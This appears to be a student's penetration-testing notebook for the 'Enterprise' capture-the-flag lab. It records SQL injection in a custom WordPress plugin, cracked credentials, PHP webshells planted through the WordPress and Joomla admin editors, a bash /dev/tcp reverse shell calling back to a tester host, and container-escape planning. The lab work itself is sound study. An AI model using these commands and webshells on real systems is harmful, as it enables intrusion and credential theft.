# Enterprise — 10.129.56.14

**Status:** 🟦 **STOPPED (deliberate)** — web-exploitation objectives complete (SQLi→creds→RCE in WP & Joomla). Remaining leg is Docker container-escape→host root = **beyond CWES scope**. Not rooted; walkthrough saved.
**escape is via the JOOMLA container, not WP** (HTB hint). Use geordi (Super User) → Joomla template RCE → `mount` for the host-shared folder = escape.

- Target: `10.129.56.14` · Hostnames: `enterprise.htb` (WP), `enterprise.local` (443 cert)
- Flags: user + root · Queued CWES: custom WP plugin SQLi ✅, file/creds hunt

## 🔑 CREDENTIALS — quick reference
_(keep this at the top; append every cred the moment it's found — see METHODOLOGY)_

| identity | secret | works on | verified |
|---|---|---|---|
| `william.riker` | `u*Z14ru0p#ttj83zS6` | **WP admin** (:80 `/wp-admin`) | ✅ → **RCE** (plugin webshell) |
| `geordi.la.forge` | `ZD3YxfnSjezg67JZ` | Joomla Super User (:8080 `/administrator`) | ⬜ not tested |
| `Guinan` | `ZxJyhGem4k338S2Y` | Joomla (:8080) | ⬜ |
| `enterprisencc170` | _(a password)_ | ❌ NOT 32812; try HOST/other-container SSH | ⬜ |
| **`NCC-1701E`** | MySQL root pw (env leak) | MySQL root @172.17.0.2 (no client in container); ❌ NOT 32812; try host SSH | ⬜ |
| MySQL `root`/`joomladb` | hash `*95B8A7B0…` (uncracked) | MySQL (already have via SQLi) | — |
| MySQL `wordpressdb` | hash `*10C910BC…` (uncracked) | MySQL | — |
| **32812 Bridge Access Code** | **HARDCODED in the LCARS service** (not a looted pw) | :32812 gate | 🔎 grep the fs for the service source |
| DB creds (WP) | in `/var/www/html/wp-config.php` (`DB_USER/DB_PASSWORD`) | MySQL | via SQLi |

**Foothold:** RCE as WP-container user (whoami pending) via `hello.php` webshell.
Loot files: `loot/{found_passwords.txt, wp_riker.hash, joomla_users.hash, mysql_users.hash, lcars/}`.

- Hostnames note: `enterprise.htb` (WP) + `enterprise.local` (443 cert); fuzz `Host:` for more.

## Kill chain
- [x] P1 Recon — full TCP + -sCV done
- [x] P3 Web enum — WP users + custom plugin `lcars` found (source review); Joomla/Python pending
- [x] P4 Web exploit — SQLi → plaintext creds in wp_posts → **Joomla Super User cracked**
- [x] P5 Foothold — **RCE via WP-admin plugin webshell** (`hello.php`); stabilize pending
- [ ] P6 Local recon (sudo -l, SUID, cron, creds, internal ports)
- [ ] P6b Container? (if root-but-wrong-namespace: mounts, caps, sock, netns)
- [ ] P7 Privesc → root

---

## 1. Infrastructure

### Ports

| port | service | version | notes |
|---|---|---|---|
| 22/tcp | ssh | OpenSSH **7.4p1** (Ubuntu) | old (2016-era); note but not entry w/o creds |
| 80/tcp | http | Apache **2.4.10 (Debian)** | **WordPress 4.8.1** — "USS Enterprise – Ships Log" |
| 443/tcp | ssl/http | Apache **2.4.25 (Ubuntu)** | Apache **default page** ("It works"). cert → hostname |
| 8080/tcp | http | Apache **2.4.10 (Debian)** | **Joomla!** — robots.txt lists `/joomla/`, `/administrator/` etc |
| 32812/tcp | custom TCP | — | **"LCARS" gate** — `Enter Bridge Access Code:`; wrong → "Invalid Code" |
| 5355/tcp | llmnr | filtered | LLMNR noise, ignore |

### Architecture read (important)

- **80 and 8080 are BOTH `Apache 2.4.10 (Debian)`** — same non-host OS → almost certainly
  **two Docker containers**. **443 is `Apache 2.4.25 (Ubuntu)`** = the **host** itself,
  showing only the stock default page. Classic reverse-proxy/container layout.
- So the two real apps (WP, Joomla) likely live in **containers**; a foothold there may be
  container-local → **P6b in play** (mounts, docker.sock, sibling containers). Host is `.1`.
- Cert: `CN=enterprise.local, O=USS Enterprise, ...` valid 2017-08 → **`enterprise.local`**;
  content dated 2017 → old software, expect real CVEs (WP 4.8.1, Joomla).

### 🔎 Python web framework detected (error-page fingerprint)

An error page carried:

```
<!-- Ticket #11289, IE bug fix: always pad the error page with enough characters
     such that it is greater than 512 bytes, even after gzip compression ... -->
```

That IE-512-byte padding comment is emitted by a **Python WSGI framework's default error
page** — NOT by Apache/PHP. So there is a **Python app on this box, distinct from the
WordPress (80) and Joomla (8080) PHP stacks.** A 4th backend.

- Framework: `Ticket #NNNNN` is Trac-style → leans **Django**; the same padding trick
  also appears in **Werkzeug/Flask**. Confident it's Python; not certain which. Disambiguate:
  - `Set-Cookie: session=...` → Flask/Werkzeug (→ **SSTI**, the GoodGames `lipsum` chain)
  - `Set-Cookie: csrftoken= / sessionid=` → Django (→ `/admin/`, DEBUG traceback = SECRET_KEY)
- **TODO: record WHERE this came from** — port + URL + status. That locates the app
  (proxied backend? path on 443? a vhost?).
- If DEBUG is on, the error page becomes a full traceback → source + secrets.

### WordPress (port 80, `enterprise.htb`) — wpscan

WP **4.8.1** (2017), theme **twentyseventeen** 1.3. `scans/wpscan.scan`.

- **XML-RPC enabled** (`/xmlrpc.php`) — two uses: `system.multicall` amplifies credential
  brute force; `pingback.ping` = **SSRF** to hit internal services (the Python app? 32812?).
- `readme.html`, `wp-cron.php` exposed. 95 version CVEs listed — but **almost all are
  *authenticated* or DoS**, so not a foothold without creds. (Unauth one of note:
  CVE-2017-8295 host-header password-reset poisoning — needs mail interaction.)

**⚠️ This scan was PASSIVE/shallow — 4 requests, NO plugin or user enumeration.**
On a WP box the foothold is almost always a **vulnerable plugin**, which this run never
looked for. Re-run aggressive:

```
wpscan --url http://enterprise.htb --enumerate ap,at,u,tt \
       --plugins-detection aggressive --api-token <t>
```

- `ap` all plugins (the likely path), `at` all themes, `u` users (→ login / the 32812
  code?), `tt` timthumbs.
- Users matter twice here: WP login, and names are candidates for the **Bridge Access
  Code** gate on 32812.

### WP aggressive enum + the custom-plugin hint

`scans/wpscan_plugins.scan` (aggressive, ~22min, 164k reqs):
- **Users:** `william.riker` (login) / slug `william-riker`. (Star Trek — Riker.)
- **Plugins:** `akismet` (stock, version undetermined) + a garbage entry
  (`github.com/placetopay/...` matched at status 200 = wordlist artifact, IGNORE).

**HTB hint: the intended bug is a custom WP plugin with SQLi.** wpscan did NOT find it,
and **cannot** — plugin enumeration requests *known* plugin paths from wpscan's DB; a
plugin written for the box isn't in that list. Same ambiguous-negative as GoodGames vhost
/ Usage `forget-password`: **a wordlist can't contain a bespoke name.** (3rd box, same trap.)

**Find a custom plugin by its footprints, not its name:**
```
# 1. page source almost always leaks the plugin dir (enqueued assets / admin-ajax / REST)
curl -s http://enterprise.htb/ | grep -oE '/wp-content/plugins/[^/"'\''\ ]+' | sort -u
# 2. dir-brute the plugins folder with a DIRECTORY wordlist (not wpscan's plugin DB)
feroxbuster -u http://enterprise.htb/wp-content/plugins/ -w .../raft-medium-directories.txt
```
Custom-plugin SQLi is classically **unauth via** `admin-ajax.php?action=<plugin_action>`
(a `wp_ajax_nopriv_` handler) or a plugin page param → point sqlmap there.

### 🔴 Custom plugin `lcars` — SQLi (whitebox, source in `loot/lcars/`)

Plugin source recovered (`loot/lcars.zip`, 3 files, dated 2017). Author header in
`lcars.php`: *"Geordi La Forge"*, comment *"need to make it secure"* (it isn't).

| file | input handling | verdict |
|---|---|---|
| `lcars.php` | stub — plugin header only, no DB code | inert |
| **`lcars_db.php`** | `$q=$_GET['query']; "... WHERE post_name = $q"` — **raw, no quotes, no cast** | 🔴 **SQLi** |
| `lcars_dbpost.php` | `$q=(int)$_GET['query']; "... WHERE ID = $q"` — **int cast** | ✅ safe (DECOY) |

**Answer (relative path to the vulnerable PHP file on :80):**
`/wp-content/plugins/lcars/lcars_db.php`  (checker may want it without the leading `/`).

- The two DB files are near-identical; the ONLY difference is `lcars_dbpost.php`'s
  `(int)` cast. The "dbpost" name is a lure — the SAFE file sounds like the input handler.
- Injection context: `post_name = $q` with **no surrounding quotes** → numeric-style
  injection point (e.g. `?query=1 UNION SELECT ...`). `wp_config.php` is included, so the
  query runs as the WP DB user against the WP schema.
- **Endpoint to test:** `http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=<PAYLOAD>`
  (direct file access — no WP auth). Next: sqlmap on `query`, then dump for creds / the
  32812 Bridge Access Code.

### 🔴 lcars SQLi — confirmed, DBs enumerated (`loot/lcars_db_sqli`)

sqlmap on `?query=` at `/wp-content/plugins/lcars/lcars_db.php`. **8 databases:**

```
information_schema  performance_schema  mysql  sys   (MySQL defaults)
wordpress    wordpressdb      (WordPress)
joomla       joomladb         (Joomla)   <- reachable from the WORDPRESS injection
```

**Key architectural finding: one shared MySQL backend across both apps.** The injection
runs as the WP DB user yet can read the Joomla schemas → a WP-plugin bug gives access to
Joomla's data (admin creds live in Joomla's `#__users`). Cross-app pivot for free.
(Revises §1's "separate containers" read: separate web front-ends, **shared DB**.)

- Two of each name (`wordpress`+`wordpressdb`, `joomla`+`joomladb`) — enumerate tables to
  see which holds real data vs. empty/decoy.
- Candidate targets to dump: WP `wp_users` (Riker hash → crack), Joomla `#__users`
  (admin hash → Joomla admin panel on :8080), and anything resembling the **32812 Bridge
  Access Code**.

### wp_users dumped — Riker's WP hash

```
william.riker : $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
```

- **`$P$` = phpass** (WordPress portable hash), **hashcat `-m 400`**. Iterated MD5
  (~8192 rounds here) — MUCH faster than bcrypt; rockyou is minutes on the 5060 Ti.
  (Corrects an earlier note calling WP hashes bcrypt-slow — they're not.)
- Saved: `loot/wp_riker.hash`. Windows GPU host:
  `D:\hashcat-7.1.2\hashcat.exe -m 400 -a 0 wp_riker.hash D:\hashcat-7.1.2\rockyou.txt`
- Only 1 WP user. Cracked pw → try: WP login, SSH (reuse), the 32812 Bridge Access Code,
  and spray at Joomla. Joomla admin hash still un-dumped (`joomladb #__users`).

### DB map — live vs decoy (via lcars SQLi)

| schema | state | notes |
|---|---|---|
| `wordpress` | **live** | `wp_users` → Riker phpass (dumped) |
| `wordpressdb` | empty | decoy |
| `joomladb` | **live** | 72 tables, prefix **`edz2g_`** — real Joomla |
| `joomla` | empty | decoy |

- The `db` suffix does NOT indicate the live one (WP=`wordpress`, Joomla=`joomladb`) —
  must check, not assume.
- **Random table prefix `edz2g_`** = Joomla anti-SQLi (stops table-name *guessing*). A
  schema-reading injection via `information_schema` defeats it outright — prefix revealed.
- Credential target in Joomla: **`edz2g_users`** (admin hash → Joomla admin panel :8080,
  a much stronger foothold than a WP author). Not yet dumped — user's call.

### edz2g_users dumped — Joomla accounts

| id | username | role | email | hash |
|---|---|---|---|---|
| 400 | **`geordi.la.forge`** | **Super User** | geordi.la.forge@enterprise.htb | `$2y$10$cXSgEkNQ...DDKaWy` |
| 401 | `Guinan` | (lower) | guinan@enterprise.htb | `$2y$10$90gyQVv7...HaqL2q` |

- **bcrypt (`$2y$10$`) → hashcat `-m 3200`** — SLOW (cost 10, like Usage; NOT phpass).
  Saved `loot/joomla_users.hash`. Windows GPU:
  `D:\hashcat-7.1.2\hashcat.exe -m 3200 -a 0 joomla_users.hash D:\hashcat-7.1.2\rockyou.txt`
- **geordi.la.forge = Super User** = the prize: Joomla admin (:8080) → template PHP edit
  = **RCE by design**. He's also the `lcars` plugin author (§2). 
- Now holding 3 hashes total: Riker (WP, phpass, cracking fast), geordi + Guinan (Joomla,
  bcrypt, slow). Reuse likely — whichever cracks first, spray everywhere (SSH, 32812, other app).

### 32812 — custom service ("LCARS")

```
Welcome to the Library Computer Access and Retrieval System
Enter Bridge Access Code:        <- wrong input -> "Invalid Code / Terminating Console"
```

A **code/credential gate** over raw TCP (not HTTP — nmap's HTTP probes got the same banner).
The "Bridge Access Code" is almost certainly **loot recovered from WP/Joomla** (a post,
config, or DB), not brute-forced. Park it until web enum yields a code. Interact with
`nc 10.129.56.14 32812`.

### Stack read

- **:80** WordPress 4.8.1 / Apache 2.4.10 (Debian container), vhost `enterprise.htb`.
- **:8080** Joomla **3.7.5** (`joomla.xml`) / Apache 2.4.10 (Debian). **CVE-2017-8917 does
  NOT apply** (fixed in 3.7.1). No notable unauth RCE/SQLi for 3.7.5. Joomla admin walled
  off: bcrypt uncrackable + lcars SQLi is SELECT-only (no write to change the hash). **Joomla
  path = DEAD END** — pivot to mining the SQLi for the 32812 code, and the Python app.
- **:443** Apache 2.4.25 (Ubuntu HOST), stock default page only. cert `enterprise.local`.
- **:32812** custom "LCARS" TCP gate (Bridge Access Code).
- **Python app** (WSGI framework, error-page fingerprint, §2) — location TBD.
- **Shared MySQL** behind WP + Joomla (proven: WP injection reads Joomla schema).

---

## 2. Enumeration

Details in the Infrastructure subsections above (WP wpscan, `lcars` plugin, DB map,
dumped users, sessions dead-end). Key artifacts: `loot/lcars/` (plugin source),
`loot/wp_riker.hash`, `loot/joomla_users.hash`, `loot/lcars_db_sqli` (sqlmap output).

---

## 3. Web attack surface

| input | endpoint | method | classes tried | result |
|---|---|---|---|---|
| `query` | `/wp-content/plugins/lcars/lcars_db.php` (:80) | GET | **SQLi** | 🔴 **confirmed** — MySQL, reads WP+Joomla DBs |
| `query` | `/wp-content/plugins/lcars/lcars_dbpost.php` (:80) | GET | SQLi | ✅ safe — `(int)` cast (decoy) |
| xmlrpc | `/xmlrpc.php` (:80) | POST | — | enabled — brute-amplify + pingback SSRF (untested) |
| — | Joomla `com_fields` (:8080) | — | known-CVE | ❌ **3.7.5 patched** vs CVE-2017-8917 (fixed 3.7.1). Joomla path dead. |
| Bridge Access Code | `:32812` raw TCP | — | — | gate; code source TBD (DB plaintext? cracked pw?) |
| — | Python app (?) | — | — | **not located** (§2 error-page fingerprint) |

---

## 4. Loot

| what | where | value |
|---|---|---|
| `lcars` plugin source | `loot/lcars/` (+`lcars.zip`) | 3 files; SQLi in `lcars_db.php` |
| sqlmap output | `loot/lcars_db_sqli` | 8 DBs; WP+Joomla schemas |
| WP user | `loot/wp_riker.hash` | `william.riker` : **`u*Z14ru0p#ttj83zS6`** (phpass, cracked) |
| Joomla users | `loot/joomla_users.hash` | `geordi.la.forge`:**`ZD3YxfnSjezg67JZ`** (Super User) · `Guinan`:**`ZxJyhGem4k338S2Y`** (cracked, found_passwords.txt) |
| Joomla schema | (via SQLi) | live `joomladb`, prefix `edz2g_`; `edz2g_users`, `edz2g_content`, etc |

Emails seen (candidate usernames for SSH/32812): `william.riker@`, `geordi.la.forge@`,
`guinan@` `enterprise.htb`.

---

## 5. Privesc

### ⚠️ PIVOT: escape is via the JOOMLA container (HTB hint)

Was tunnel-visioned on the WP container — its only host mount is the webroot (dead end).
**HTB hint: the escape uses a folder in the *Joomla* Docker container shared with the host.**
We cracked the Joomla Super User but never used it (went WP for RCE instead).

Path:
1. Joomla admin `http://enterprise.htb:8080/administrator/` — `geordi.la.forge:ZD3YxfnSjezg67JZ`
2. Extensions → Templates → **Templates** → edit `error.php`/`index.php` → webshell/revshell
   → shell in the **Joomla container**.
3. `mount | grep -vE 'proc|sysfs|cgroup|tmpfs|devpts|mqueue'` in the Joomla container →
   host-shared folder = `/dev/mapper/enterprise--vg-root on /<PATH>`. **That `/<PATH>` is the
   answer to the hint AND the escape surface** (unlike WP's webroot, host executes this one).

### P6b escape — WP-container direct routes RULED OUT

- **caps = 0** (`CapEff/CapPrm 0000…0000`), fully unprivileged → no mount/CAP_SYS_ADMIN.
- **`/dev/mapper` empty**, debugfs "No such file" → host block device NOT exposed. Direct-disk escape dead.
- `mkdir /mnt` denied (can't write outside the mount). No SUID escape (all stock).

**Only escape surface = writable host-backed `/var/www/html` + a HOST process that reads it.**
Web is mostly circular (published :80/:8080/:32812 NAT back to containers). **BUT host :443
(genuine host Apache 2.4.25, cert `enterprise.local`) is NOT circular** — only its *default*
vhost tested (404'd marker). **Untested: a name-based vhost `enterprise.local` whose docroot
is the shared `/var/www/html`:**
```
curl -sk https://172.17.0.1/marker.txt -H 'Host: enterprise.local'
```
Marker returned → write PHP shell → request via that vhost → **RCE in HOST context = escape**.

If not: run the `/dev/tcp` port sweep of .1/.2/.3 to locate the **Python app** (Werkzeug/Flask
per §2 → SSTI, GoodGames-style) and where **32812** runs — likely the real escape/root.

### P6b — contained (WP Debian container confirmed)

**🔑 NEW cred from `env` (Docker link leak): `MYSQL_ENV_MYSQL_ROOT_PASSWORD=NCC-1701E`**
(MySQL container's root pw, "Enterprise-E"). NOT one of the 4 blog passwords → untested
against 32812/SSH. Network map: host `172.17.0.1`, **MySQL `172.17.0.2`**, us `172.17.0.4`.

**Bind-mount (from `mount`):** `/var/www/html` ← `/dev/mapper/enterprise--vg-root` (HOST
LVM root, **rw**). Host-backed disk = a host-filesystem foothold to explore. `/` is aufs
(container). SUID all stock (no escape there).

**Decoy `user.txt`** in the container: *"This is not the Enterprise! ... Your in the
Holodeck!"* — a troll flag. Confirms containment (Holodeck = sim = container; the real
flags are on **the host = "the Enterprise"**). Shell: `www-data@b8319d86d21e` (12-hex =
container id), IP `172.17.0.4`, host `172.17.0.1`.

`/etc/passwd` = **system accounts only, NO human users** (no riker/geordi as Linux users) →
stock container, empty `/home` = the container tell. This is the WP container, not the host.

- **SSH-reuse of the found passwords has no target in here** — those accounts don't exist
  locally. They may work on the **host** or a **sibling container**.
- The **32812 service** and the **Python app** are NOT in this minimal container → on the
  host / another container. Escape needed to reach them.
- **Enumerate the escape seam (P6b):**
  - `hostname` (12-hex = container id), `ls -la /.dockerenv`, `cat /proc/1/cgroup`
  - `mount` / `cat /proc/mounts` — **host bind-mounts are the #1 escape** (like GoodGames)
  - `ip a` / `ip route` — host at `.1`; re-scan the bridge for 32812/Python/sibling apps
  - `env` — creds/hostnames passed to the container
  - `id` / `sudo -l` — what is the webshell running as (www-data?)

### 🔴 Foothold — RCE via WordPress admin (plugin webshell) → reverse shell

- Network: container **`172.17.0.4`** on the **default docker bridge `172.17.0.0/16`** →
  **host = `172.17.0.1`**. (Leaked in an Apache 400 error page footer.)
- **Working reverse shell** (payload A, `exploits/revshell_urls.txt`) — needed BOTH fixes:
  `bash -c '...'` wrapper (PHP `system()` → `/bin/sh`=dash, which can't do `>&`/`/dev/tcp`)
  AND URL-encoding (raw `&` truncates the query param → the earlier 400s).
  ```
  hello.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.212%2F9001%200%3E%261%27
  ```
- Reusable: `exploits/revshell_urls.txt` (generator) + `exploits/fire.sh` (curl --data-urlencode
  from a file — bulletproof vs hand-encoding).


Riker's cracked WP password → WP admin (`/wp-admin`) → **Plugin/Theme editor** → wrote a
PHP webshell into a plugin file:

```
GET /wp-content/plugins/hello.php?cmd=whoami      -> RCE (whoami output pending)
```

- Path in the **WordPress Debian container** (§1: 80/8080 are containers, 443 is host).
- **P6b likely in play** — confirm container (`/.dockerenv`, `hostname`, `cat /proc/1/cgroup`),
  check `mount` for host bind-mounts, host at `.1`.
- **Stabilize:** upgrade to a reverse shell → 9001, then `python3 -c 'import pty;...'`.
  A webshell in a plugin file is fragile.
- **Hunt from the shell:** the **32812 Bridge Access Code** (not in the 4 found pw — look in
  files/env/other configs), the **Python app** source (still unlocated), `/etc/passwd` for
  real users to spray `enterprisencc170` + the others at SSH/su.



_pending_

---

## 6. Dead ends

### Joomla `edz2g_session` table — all guest sessions

Session data is base64'd PHP-serialized `Joomla\Registry\Registry`. Decoded, every row is:
`JUser id: 0` (anonymous), `guest: 1`, only field of note a per-request CSRF `token`.

- **No authenticated/admin session to hijack** — all rows userid=0. Timestamps are
  current (self-generated by scanning). Decoding more rows is pointless; identical structure.
- Lesson: check **who owns the session** (`JUser id`) before mining session data. All
  guest = real dead end, decided in 30s. (Counter to ambiguous-negatives: some negatives
  ARE conclusive — the skill is telling which.)

### ✅ Cracked (custom wordlist) + password map

```
geordi.la.forge  (Joomla Super User)  ZD3YxfnSjezg67JZ      <- Joomla admin -> RCE
Guinan           (Joomla)             ZxJyhGem4k338S2Y
william.riker    (WordPress, phpass)  u*Z14ru0p#ttj83zS6    <- try WP login / SSH reuse
enterprisencc170          UNASSIGNED  <- ONLY leftover -> almost certainly the 32812 CODE
```

All 3 hashes now mapped to the 4 found passwords; `enterprisencc170` is the sole password
that matches NO hash → by elimination it's the **32812 Bridge Access Code** (also the
thematic fit: "Enterprise NCC-1701"). `nc 10.129.56.14 32812` → enter it.

**Foothold path — Joomla Super User → RCE (template edit):**
1. `http://enterprise.htb:8080/administrator/` login `geordi.la.forge:ZD3YxfnSjezg67JZ`
2. Extensions → Templates → **Templates** → pick one (protostar/beez3)
3. edit `error.php` or `index.php` → `<?php system($_GET['c']); ?>`
4. hit `http://enterprise.htb:8080/templates/<tpl>/error.php?c=id`
→ RCE in the **Joomla Debian container** (bypasses secure_file_priv — write via Joomla, not MySQL).

Riker's `u*Z14ru0p#ttj83zS6` → **WP admin (verified) → RCE**. Leftover `enterprisencc170`
was GUESSED (elimination) to be the 32812 code — **TESTED, WRONG**: none of the 4 passwords
open 32812. The Bridge Access Code is elsewhere (likely reachable post-RCE). `enterprisencc170`
is still an SSH/su-reuse candidate. (Lesson: elimination = hypothesis to test, not a fact.)

### 🟢 Plaintext passwords — `wp_posts` draft "Passwords" (THE breakthrough)

Draft/private post literally titled **Passwords**: *"Needed somewhere to put some passwords
quickly"* → `loot/found_passwords.txt`:

```
ZxJyhGem4k338S2Y
enterprisencc170          # = "Enterprise NCC-1701", thematic
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```

**These are the custom wordlist the box wanted you to find** — the Joomla bcrypt resisted
rockyou because the passwords are THESE, not in any public list. (Validates §7.1: cracking
wasn't the path; *finding the wordlist* was.)

Use them:
1. **Crack the Joomla bcrypt with this list** → maps password→user (geordi = Super User):
   `hashcat -m 3200 joomla_users.hash found_passwords.txt`  (instant)
2. **Joomla login** (:8080 `/administrator/`) as `geordi.la.forge` → Super User → template
   PHP edit = RCE.
3. **32812 Bridge Access Code** — try each at `nc 10.129.56.14 32812`.
4. **SSH / su** reuse against system users.

Also in wp_posts: a `test` draft `<?php echo phpinfo();?>` and taunts ("Try harder RT <3").

### DBA — but file R/W is walled off (webshell path DEAD)

User is DBA and HAS `FILE`/`SUPER`/`INSERT`/`UPDATE`/`CREATE ROUTINE` etc. **But two walls
make it useless for RCE here:**

1. **`SELECT @@secure_file_priv = '/var/lib/mysql-files/'`** → `INTO OUTFILE` and
   `LOAD_FILE` are confined to that one dir (not web-served, not the files we want).
   **No webshell to `/var/www/html`; no `LOAD_FILE('/etc/passwd')`.**
2. **Injection is SELECT-only** (single-statement `mysqli::query`, no stacked queries) →
   the `INSERT/UPDATE/CREATE FUNCTION` privileges can't be *used* through it (no UDF RCE,
   no admin-hash rewrite). Privileges belong to the user, unreachable via this injection.

**CONFIRMED (10:39):** sqlmap `--file-write` to `/var/www/html/shell.php` FAILED. sqlmap
blamed 'no write privileges in destination' — misleading; real cause is `secure_file_priv`
(fails for ANY path outside `/var/lib/mysql-files/`, so trying other web dirs is pointless).
Webshell path fully closed. Backend: Debian 8 jessie, PHP 5.6.31.

**Lesson: the `secure_file_priv` pre-flight caught this before building a webshell that
could never land.** Verify a primitive's constraints before committing. (I oversold DBA
as "the foothold" — corrected. See §7.)

**So the SQLi is a pure DATA-READ primitive.** The path is data, not files: the **32812
Bridge Access Code** in a table not yet read — `wp_posts` (the "Ships Log" blog!),
`edz2g_content` (Joomla articles), `wp_options`, or a custom table. Also: locate the
**Python app** (§2).

### MySQL user hashes (sqlmap `--passwords`)

MySQL native (`*`+40hex = SHA1(SHA1(pw))), **hashcat `-m 300`** — FAST (not bcrypt).
`loot/mysql_users.hash` (asterisk stripped).

| MySQL account | hash | note |
|---|---|---|
| `joomladb` **+** `root` | `*95B8A7B0...285253` | **shared pw** across both — best crack target |
| `root` (2nd host) | `*2EB70FD4...7BC0DF` | |
| `wordpressdb` | `*10C910BC...125630` | |
| `mysql.sys` | `*THISISNOTAVALID...` | locked default, ignore |

- **Value = reuse only.** These are DB-account passwords; we already have DBA. Worth
  cracking (fast) ONLY to spray at **system accounts (SSH/su)** — a MySQL root pw reused
  as a Linux pw is the play. Not a DB unlock (already have that).
- **Calibration:** side-lead. The direct foothold is DBA **file R/W** (LOAD_FILE for the
  32812/Python source; INTO OUTFILE webshell). Don't let cheap hashes pull off that.
- Windows GPU: `hashcat.exe -m 300 -a 0 mysql_users.hash rockyou.txt`

### Joomla 3.7.5 — unauth-exploit path closed

`joomla.xml` → **3.7.5** (not 3.7.0). CVE-2017-8917 (com_fields unauth SQLi) fixed in
**3.7.1**, so it does NOT apply. 3.7.5 has no notable unauth RCE/SQLi.

- Getting exact version BEFORE running the exploit avoided a false "exploit broken"
  negative — the run would have failed only because of the patch level. (Proactive
  negative-avoidance; see §7.1.)
- Joomla admin unreachable by every tried angle: crack (bcrypt, ruled out), unauth CVE
  (patched), SQLi-write (lcars is SELECT-only, single-statement — no UPDATE).
- **Pivot:** the levers are (1) the **32812 Bridge Access Code** — likely plaintext in the
  DB we can already read (`edz2g_content`/config, unread), and (2) the **Python app**
  (§2 fingerprint) — a backend never located.

### bcrypt cracking status
- geordi.la.forge (`$2y$10$cXSgEkNQ...`) — **NOT cracked** with rockyou + best66 rule.
- Guinan (`$2y$10$90gyQVv7...`) — still running.
- bcrypt cost-10 is slow; a rockyou+rules miss ≠ password is uncrackable, but pivot to
  other angles rather than waiting: Riker's WP pw (phpass, fast), Joomla version → unauth
  exploit, or the 32812 code hunt in `edz2g_content`/config.

---

## 7. Lessons

0. **Verify a primitive's constraints before committing to it.** SQLi user was DBA — I
   (and the excitement) jumped to "INTO OUTFILE webshell = foothold." The `secure_file_priv`
   pre-flight came back `/var/lib/mysql-files/`, killing both file-write AND file-read, and
   the SELECT-only injection blocks using the write privileges anyway. A cheap check
   ('is this actually usable?') beats debugging a webshell that can't land. DBA ≠ RCE.

1. **Crack economics = path signal (HTB heuristic).** bcrypt cost-10 with an ~8h rockyou
   ETA and no early hit → cracking is **not the intended path**. HTB boxes are solvable
   without a GPU farm: an intended crack falls fast (seconds, like Usage/GoodGames), or
   the way in is elsewhere. A long ETA is the box telling you to pivot — don't block on it.
   The goal was never the hash; it's the *access* the hash represents, reachable other ways
   (version-based unauth exploit, plaintext creds in the DB, reuse).

2. **Check who owns a session before mining it.** Joomla `edz2g_session` = all `JUser id:0`
   guest sessions → nothing to hijack. Decided in 30s off one field. (See §6.)

3. **Random DB table prefix (`edz2g_`) only stops table-name guessing** — a schema-reading
   SQLi via `information_schema` walks past it. (See §2.)

4. **A schema-reading SQLi in one app reaches co-located apps.** WP-plugin injection read
   Joomla's DB (shared MySQL). One bug, both apps' data.

---

## 7b. CWES relevance & stopping point

**Stopped deliberately at P6b (container escape).** Everything up to a shell is web
exploitation (in CWES scope); the remaining Docker breakout to host root is Linux/container
privesc (out of scope). Web objectives all met:

- **Whitebox custom-plugin SQLi** (`lcars_db.php`) — source review, taint tracking, spotting
  the `(int)`-cast decoy (`lcars_dbpost.php`). Core CWES skill.
- **SQLi exploitation under constraints** — DBA but `secure_file_priv` walls file R/W;
  SELECT-only injection blocks stacked writes/UDF. Learned to enumerate what the DB user can
  *actually do through the injection*, not just what it's granted.
- **Credential hunting** — plaintext in a `wp_posts` draft; the found strings were the custom
  wordlist that cracked the "uncrackable" bcrypt (rockyou never had them).
- **Multi-app enum** — WP (plugin SQLi) + Joomla (Super User → template RCE) + a Python/WSGI
  fingerprint; cross-app DB access via one shared MySQL.
- **Two RCE-via-admin techniques** — WP plugin-editor webshell; Joomla template-editor webshell.
- **Docker env-var cred leak** (`MYSQL_ENV_MYSQL_ROOT_PASSWORD`) via legacy container linking.

**If resumed (out of scope, walkthrough saved):** Joomla container (via geordi Super User)
has a host-shared folder (`mount`) that the host executes → escape → host root. 32812 LCARS
gate + the Python app are downstream of that.

## 8. Command log

```
# 1. scaffold
mkdir -p Labs/Enterprise/{scans,loot,exploits}

# 2. full TCP sweep
nmap -p- --min-rate 5000 -T4 -oA scans/allports 10.129.56.14
#    -> 22 ssh, 80 http, 443 https, 8080 http-proxy, 32812 unknown; 5355 filtered (llmnr)

# 3. service/version scan
nmap -sCV -p22,80,443,8080,32812 -oA scans/services 10.129.56.14
#    22 OpenSSH 7.4p1 | 80 WordPress 4.8.1 (Apache 2.4.10 Debian)
#    443 Apache 2.4.25 Ubuntu DEFAULT page, cert CN=enterprise.local
#    8080 Joomla (Apache 2.4.10 Debian) | 32812 custom "LCARS" code gate
#    -> 80/8080 = Debian containers; 443 = Ubuntu host. enterprise.local.

# 4. wpscan (passive/default - shallow, 4 reqs, no plugin/user enum)
wpscan --url enterprise.htb --api-token <t>
#    -> WP 4.8.1, theme twentyseventeen, xmlrpc enabled, readme/wp-cron exposed
#    -> 95 version CVEs (mostly authed/DoS). NO plugins/users enumerated -> re-run aggressive

# 5. aggressive wpscan (ap,at,u,tt) - 22min, 164k reqs
wpscan --url http://enterprise.htb --enumerate ap,at,u,tt --plugins-detection aggressive
#    -> users: william.riker / william-riker ; plugins: akismet (+ 1 garbage hit)
#    -> custom plugin NOT found (wpscan enumerates KNOWN plugins only). find via source/dirbrute.

# 6. custom plugin `lcars` source recovered (loot/lcars.zip) -> whitebox review
cat loot/lcars/lcars_db.php loot/lcars/lcars_dbpost.php
#    -> lcars_db.php: WHERE post_name = $_GET[query]  (raw, no quote/cast) = SQLi
#    -> lcars_dbpost.php: (int)$_GET[query] = SAFE decoy
#    -> vuln path: /wp-content/plugins/lcars/lcars_db.php?query=

# 7. lcars SQLi confirmed + enumerated (USER-DRIVEN, solo)
sqlmap ...  /wp-content/plugins/lcars/lcars_db.php  -p query --dbs
#    -> 8 DBs: wordpress, wordpressdb, joomla, joomladb (+4 default)
#    -> WP injection can read Joomla schemas = SHARED MySQL backend, cross-app pivot

# 8. dumped wp_users -> william.riker : $P$B... (phpass, -m 400)
#    saved loot/wp_riker.hash ; crack on Windows GPU (rockyou, fast for phpass)

# 9. schema map: wordpress + joomladb live; wordpressdb + joomla empty decoys
